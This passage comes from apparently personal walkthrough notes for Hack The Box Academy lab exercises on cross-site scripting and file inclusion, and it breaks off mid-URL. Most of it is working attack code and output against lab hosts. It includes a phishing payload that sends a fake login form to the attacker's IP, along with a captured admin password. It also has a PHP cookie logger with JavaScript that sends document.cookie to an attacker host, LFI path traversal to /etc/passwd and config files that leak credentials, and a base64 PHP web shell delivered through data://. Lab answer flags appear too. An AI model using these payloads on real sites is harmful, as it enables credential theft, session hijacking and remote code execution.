<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-362-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-362-1"><a id="__codelineno-362-1" name="__codelineno-362-1"></a>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</span></code></pre></div></td></tr></table></div>
<p>Results:  HTB{570r3d_f0r_3v3ry0n3_70_533}</p>
<h4 id="reflected-xss">Reflected XSS</h4>
<p><strong>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-363-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-363-1"><a id="__codelineno-363-1" name="__codelineno-363-1"></a>http://83.136.253.163:57837/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{r3fl3c73d_b4ck_2_m3}</p>
<h4 id="dom-xss">DOM XSS</h4>
<p>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
 
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-364-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-364-1"><a id="__codelineno-364-1" name="__codelineno-364-1"></a># Enter &lt;img src=&quot;&quot; onerror=alert(document.cookie)&gt;
</span></code></pre></div></td></tr></table></div></p>
<p>Results: </p>
<h4 id="xss-discovery">XSS Discovery</h4>
<p><strong>Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-365-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-365-1"><a id="__codelineno-365-1" name="__codelineno-365-1"></a># Enter http://$ip:$port/?fullname=lolo&amp;username=lala&amp;password=lalala&amp;email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
</span></code></pre></div></td></tr></table></div>
<p>Results: email</p>
<p><strong>What type of XSS was found on the above server? "name only"</strong></p>
<p>Results:  Reflected</p>
<h3 id="xss-attacks">XSS Attacks</h3>
<h4 id="phishing">Phishing</h4>
<p><strong>Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.</strong></p>
<p>Creating a valid payload in http://10.129.148.221/phishing/index.php?url= This would be the payload:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-366-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-366-1"><a id="__codelineno-366-1" name="__codelineno-366-1"></a>\`/&#39;&lt;/script/--!&gt;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.14.198&gt;    &lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;
</span></code></pre></div></td></tr></table></div>
<p>This would be the link generated:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-367-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-367-1"><a id="__codelineno-367-1" name="__codelineno-367-1"></a>http://10.129.148.221/phishing/index.php?url=%5C%60%2F%27%3C%2Fscript%2F--%21%3E%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.198%3E++++%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E
</span></code></pre></div></td></tr></table></div>
<p>Starting a netcat listener:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-368-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-368-1"><a id="__codelineno-368-1" name="__codelineno-368-1"></a>sudo nc -lvnp 80
</span></code></pre></div></td></tr></table></div>
<p>Visiting http://10.129.148.221/phishing/send.php and entering the link generated.</p>
<p>In the netcat  listener we obtain:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-369-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-369-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-369-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-369-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-369-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-369-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-369-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-369-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-369-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-369-10">10</a></span>
<span class="normal"><a href="#__codelineno-369-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-369-1"><a id="__codelineno-369-1" name="__codelineno-369-1"></a>listening on [any] 80 ...
</span><span id="__span-369-2"><a id="__codelineno-369-2" name="__codelineno-369-2"></a>connect to [10.10.14.198] from (UNKNOWN) [10.129.148.221] 46802
</span><span id="__span-369-3"><a id="__codelineno-369-3" name="__codelineno-369-3"></a>GET /?username=admin&amp;password=p1zd0nt57341myp455&amp;submit=Login HTTP/1.1
</span><span id="__span-369-4"><a id="__codelineno-369-4" name="__codelineno-369-4"></a>Host: 10.10.14.198
</span><span id="__span-369-5"><a id="__codelineno-369-5" name="__codelineno-369-5"></a>Connection: keep-alive
</span><span id="__span-369-6"><a id="__codelineno-369-6" name="__codelineno-369-6"></a>Upgrade-Insecure-Requests: 1
</span><span id="__span-369-7"><a id="__codelineno-369-7" name="__codelineno-369-7"></a>User-Agent: HTBXSS/1.0
</span><span id="__span-369-8"><a id="__codelineno-369-8" name="__codelineno-369-8"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span><span id="__span-369-9"><a id="__codelineno-369-9" name="__codelineno-369-9"></a>Referer: http://10.129.148.221/
</span><span id="__span-369-10"><a id="__codelineno-369-10" name="__codelineno-369-10"></a>Accept-Encoding: gzip, deflate
</span><span id="__span-369-11"><a id="__codelineno-369-11" name="__codelineno-369-11"></a>Accept-Language: en-US
</span></code></pre></div></td></tr></table></div>
<p>We use the creds for accessing to /phishing/login.php and grabbing the flag</p>
<p>Results: HTB{r3f13c73d_cr3d5_84ck_2_m3}</p>
<h4 id="session-hijacking">Session Hijacking</h4>
<p><strong>Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.</strong></p>
<p>Create a file index.php in the attacker machine:</p>
<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-370-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-370-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-370-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-370-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-370-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-370-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-370-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-370-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-370-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-370-10">10</a></span>
<span class="normal"><a href="#__codelineno-370-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-370-1"><a id="__codelineno-370-1" name="__codelineno-370-1"></a><span class="cp">&lt;?php</span>
</span><span id="__span-370-2"><a id="__codelineno-370-2" name="__codelineno-370-2"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span id="__span-370-3"><a id="__codelineno-370-3" name="__codelineno-370-3"></a>    <span class="nv">$list</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
</span><span id="__span-370-4"><a id="__codelineno-370-4" name="__codelineno-370-4"></a>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-370-5"><a id="__codelineno-370-5" name="__codelineno-370-5"></a>        <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span><span id="__span-370-6"><a id="__codelineno-370-6" name="__codelineno-370-6"></a>        <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;cookies.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span id="__span-370-7"><a id="__codelineno-370-7" name="__codelineno-370-7"></a>        <span class="nb">fputs</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;Victim IP: </span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> | Cookie: </span><span class="si">{</span><span class="nv">$cookie</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span id="__span-370-8"><a id="__codelineno-370-8" name="__codelineno-370-8"></a>        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span><span id="__span-370-9"><a id="__codelineno-370-9" name="__codelineno-370-9"></a>    <span class="p">}</span>
</span><span id="__span-370-10"><a id="__codelineno-370-10" name="__codelineno-370-10"></a><span class="p">}</span>
</span><span id="__span-370-11"><a id="__codelineno-370-11" name="__codelineno-370-11"></a><span class="cp">?&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>Have a php server listening:</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-371-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-371-1"><a id="__codelineno-371-1" name="__codelineno-371-1"></a>sudo<span class="w"> </span>php<span class="w"> </span>-S<span class="w"> </span><span class="m">0</span>.0.0.0:80
</span></code></pre></div></td></tr></table></div>
<p>Enter $ip/hijacking and enter this payload in every field. Use the field name (username, name, surname...) as <code>&lt;custom.name&gt;</code> when different payloads:</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-372-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-372-1"><a id="__codelineno-372-1" name="__codelineno-372-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=%</span><span class="mf">27</span><span class="nx">http</span><span class="o">:</span><span class="c1">//attackerIP/index.php?c=%27+document.cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>If successful, you will see a connection in your php server like this:</p>
<p><img alt="xss blind" src="../img/xss_blind_00.png" /></p>
<p>Then, <code>profile</code> would be the vulnerable input (parameter <code>imgurl</code>). The URL:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-373-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-373-1"><a id="__codelineno-373-1" name="__codelineno-373-1"></a>http://VICTIMIP/hijacking/?fullname=Lala%20lalasurname%2Ffullname%3C%2Fscript%3E&amp;username=%22%3E%3Cscript+src%3Dhttp%3A%2F%2FAttackerIP%2Fusername%3C%2Fscript%3E&amp;password=lala&amp;email=lala%40gmail.com&amp;imgurl=%22%3E%3Cscript%20src=%22http://AttackerIP/lala.js%22%3E%3C/script%3E
</span></code></pre></div></td></tr></table></div>
<p>Beside the index.php, have a lala.js in your php server:</p>
<div class="language-js highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-374-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-374-1"><a id="__codelineno-374-1" name="__codelineno-374-1"></a><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://attackerIP/index.php?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
</span></code></pre></div></td></tr></table></div>
<p>Run your php server:</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-375-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-375-1"><a id="__codelineno-375-1" name="__codelineno-375-1"></a>sudo<span class="w"> </span>php<span class="w"> </span>-S<span class="w"> </span><span class="m">0</span>.0.0.0:80
</span></code></pre></div></td></tr></table></div>
<p>Now, we can change the URL in the XSS payload we found earlier to use <code>lala.js</code>. For instance:</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-376-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-376-1"><a id="__codelineno-376-1" name="__codelineno-376-1"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://attackerIP/lala.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>You will log the following activity in your php server:</p>
<p><img alt="xss blind" src="../img/xss_blind_02.png" /></p>
<p>Results:  HTB{4lw4y5_53cur3_y0ur_c00k135}</p>
<h3 id="xss-prevention">XSS Prevention</h3>
<h4 id="skills-assessment_5">Skills Assessment</h4>
<p><strong>What is the value of the 'flag' cookie?</strong></p>
<p>Enter payload in all form fields. The vulnerable one is <code>website</code> with the payload</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-377-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-377-1"><a id="__codelineno-377-1" name="__codelineno-377-1"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;http://attackerIP/website&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>I have a php server running, with this index.php:</p>
<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-378-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-378-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-378-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-378-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-378-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-378-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-378-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-378-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-378-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-378-10">10</a></span>
<span class="normal"><a href="#__codelineno-378-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-378-1"><a id="__codelineno-378-1" name="__codelineno-378-1"></a><span class="cp">&lt;?php</span>
</span><span id="__span-378-2"><a id="__codelineno-378-2" name="__codelineno-378-2"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span id="__span-378-3"><a id="__codelineno-378-3" name="__codelineno-378-3"></a>    <span class="nv">$list</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
</span><span id="__span-378-4"><a id="__codelineno-378-4" name="__codelineno-378-4"></a>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-378-5"><a id="__codelineno-378-5" name="__codelineno-378-5"></a>        <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span><span id="__span-378-6"><a id="__codelineno-378-6" name="__codelineno-378-6"></a>        <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;cookies.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span id="__span-378-7"><a id="__codelineno-378-7" name="__codelineno-378-7"></a>        <span class="nb">fputs</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;Victim IP: </span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> | Cookie: </span><span class="si">{</span><span class="nv">$cookie</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span id="__span-378-8"><a id="__codelineno-378-8" name="__codelineno-378-8"></a>        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span><span id="__span-378-9"><a id="__codelineno-378-9" name="__codelineno-378-9"></a>    <span class="p">}</span>
</span><span id="__span-378-10"><a id="__codelineno-378-10" name="__codelineno-378-10"></a><span class="p">}</span>
</span><span id="__span-378-11"><a id="__codelineno-378-11" name="__codelineno-378-11"></a><span class="cp">?&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>I know that it is the parameter <code>webserver</code> because of this:</p>
<p><img alt="xss_blind_01" src="../img/xss_blind_01.png" /></p>
<p>Now, I have also this file lala.js in my server:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-379-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-379-1"><a id="__codelineno-379-1" name="__codelineno-379-1"></a>&lt;script src=&#39;http://attackerIP/lala.js&#39;&gt;&lt;/script&gt;
</span></code></pre></div></td></tr></table></div>
<p>And in my php server:</p>
<p><img alt="xss_blind_03" src="../img/xss_blind_03.png" /></p>
<p>Results:  HTB{cr055_5173_5cr1p71n6_n1nj4}</p>
<h2 id="file-inclusion"><a href="https://academy.hackthebox.com/module/details/23">File Inclusion</a></h2>
<h3 id="file-disclosure">File Disclosure</h3>
<p><strong>Using the file inclusion find the name of a user on the system that starts with "b".</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-380-1">1</a></span>
<span class="normal"><a href="#__codelineno-380-2">2</a></span>
<span class="normal"><a href="#__codelineno-380-3">3</a></span>
<span class="normal"><a href="#__codelineno-380-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-380-1"><a id="__codelineno-380-1" name="__codelineno-380-1"></a># Access the webapp and craft the url to:
</span><span id="__span-380-2"><a id="__codelineno-380-2" name="__codelineno-380-2"></a>http://94.237.59.180:37333/index.php?language=../../../../etc/passwd
</span><span id="__span-380-3"><a id="__codelineno-380-3" name="__codelineno-380-3"></a>
</span><span id="__span-380-4"><a id="__codelineno-380-4" name="__codelineno-380-4"></a># You will see the user barry
</span></code></pre></div></td></tr></table></div>
<p>Results: barry</p>
<p>Submit the contents of the flag.txt file located in the /usr/share/flags directory.
 
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-381-1">1</a></span>
<span class="normal"><a href="#__codelineno-381-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-381-1"><a id="__codelineno-381-1" name="__codelineno-381-1"></a># Access the webapp and craft the url to:
</span><span id="__span-381-2"><a id="__codelineno-381-2" name="__codelineno-381-2"></a>http://94.237.59.180:37333/index.php?language=../../../..//usr/share/flags/flag.txt
</span></code></pre></div></td></tr></table></div></p>
<p>Results: HTB{n3v3r_tru$t_u$3r_!nput} </p>
<p><strong>The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-382-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-382-1"><a id="__codelineno-382-1" name="__codelineno-382-1"></a>http://94.237.56.125:54223/index.php?language=languages/....//....//....//....//flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  <code>HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}</code></p>
<p><strong>Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-383-1">1</a></span>
<span class="normal"><a href="#__codelineno-383-2">2</a></span>
<span class="normal"><a href="#__codelineno-383-3">3</a></span>
<span class="normal"><a href="#__codelineno-383-4">4</a></span>
<span class="normal"><a href="#__codelineno-383-5">5</a></span>
<span class="normal"><a href="#__codelineno-383-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-383-1"><a id="__codelineno-383-1" name="__codelineno-383-1"></a>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.54.116:34705/FUZZ.php
</span><span id="__span-383-2"><a id="__codelineno-383-2" name="__codelineno-383-2"></a>
</span><span id="__span-383-3"><a id="__codelineno-383-3" name="__codelineno-383-3"></a>http://94.237.54.116:34705/index.php?language=php://filter/read=convert.base64-encode/resource=configure
</span><span id="__span-383-4"><a id="__codelineno-383-4" name="__codelineno-383-4"></a>
</span><span id="__span-383-5"><a id="__codelineno-383-5" name="__codelineno-383-5"></a># Now we decode the output:
</span><span id="__span-383-6"><a id="__codelineno-383-6" name="__codelineno-383-6"></a>echo -n &quot;PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7&quot; | base64 -d
</span></code></pre></div></td></tr></table></div>
<p>Output:</p>
<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-384-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-384-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-384-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-384-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-384-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-384-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-384-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-384-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-384-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-384-10">10</a></span>
<span class="normal"><a href="#__codelineno-384-11">11</a></span>
<span class="normal"><a href="#__codelineno-384-12">12</a></span>
<span class="normal"><a href="#__codelineno-384-13">13</a></span>
<span class="normal"><a href="#__codelineno-384-14">14</a></span>
<span class="normal"><a href="#__codelineno-384-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-384-1"><a id="__codelineno-384-1" name="__codelineno-384-1"></a><span class="cp">&lt;?php</span>
</span><span id="__span-384-2"><a id="__codelineno-384-2" name="__codelineno-384-2"></a>
</span><span id="__span-384-3"><a id="__codelineno-384-3" name="__codelineno-384-3"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">realpath</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">==</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_FILENAME&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span id="__span-384-4"><a id="__codelineno-384-4" name="__codelineno-384-4"></a>  <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 403 Forbidden&#39;</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">,</span> <span class="mi">403</span><span class="p">);</span>
</span><span id="__span-384-5"><a id="__codelineno-384-5" name="__codelineno-384-5"></a>  <span class="k">die</span><span class="p">(</span><span class="nb">header</span><span class="p">(</span><span class="s1">&#39;location: /index.php&#39;</span><span class="p">));</span>
</span><span id="__span-384-6"><a id="__codelineno-384-6" name="__codelineno-384-6"></a><span class="p">}</span>
</span><span id="__span-384-7"><a id="__codelineno-384-7" name="__codelineno-384-7"></a>
</span><span id="__span-384-8"><a id="__codelineno-384-8" name="__codelineno-384-8"></a><span class="nv">$config</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span><span id="__span-384-9"><a id="__codelineno-384-9" name="__codelineno-384-9"></a>  <span class="s1">&#39;DB_HOST&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;db.inlanefreight.local&#39;</span><span class="p">,</span>
</span><span id="__span-384-10"><a id="__codelineno-384-10" name="__codelineno-384-10"></a>  <span class="s1">&#39;DB_USERNAME&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
</span><span id="__span-384-11"><a id="__codelineno-384-11" name="__codelineno-384-11"></a>  <span class="s1">&#39;DB_PASSWORD&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}&#39;</span><span class="p">,</span>
</span><span id="__span-384-12"><a id="__codelineno-384-12" name="__codelineno-384-12"></a>  <span class="s1">&#39;DB_DATABASE&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;blogdb&#39;</span>
</span><span id="__span-384-13"><a id="__codelineno-384-13" name="__codelineno-384-13"></a><span class="p">);</span>
</span><span id="__span-384-14"><a id="__codelineno-384-14" name="__codelineno-384-14"></a>
</span><span id="__span-384-15"><a id="__codelineno-384-15" name="__codelineno-384-15"></a><span class="nv">$API_KEY</span> <span class="o">=</span> <span class="s2">&quot;Awew242GDshrf46+35/k&quot;</span><span class="p">;</span> 
</span></code></pre></div></td></tr></table></div>
<p>Results:  <code>HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}</code></p>
<h3 id="remote-code-execution">Remote Code Execution</h3>
<p><strong>Try to gain RCE using one of the PHP wrappers and read the flag at /</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-385-1">1</a></span>
<span class="normal"><a href="#__codelineno-385-2">2</a></span>
<span class="normal"><a href="#__codelineno-385-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-385-1"><a id="__codelineno-385-1" name="__codelineno-385-1"></a>http://94.237.54.42:31967/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=ls+/
</span><span id="__span-385-2"><a id="__codelineno-385-2" name="__codelineno-385-2"></a>
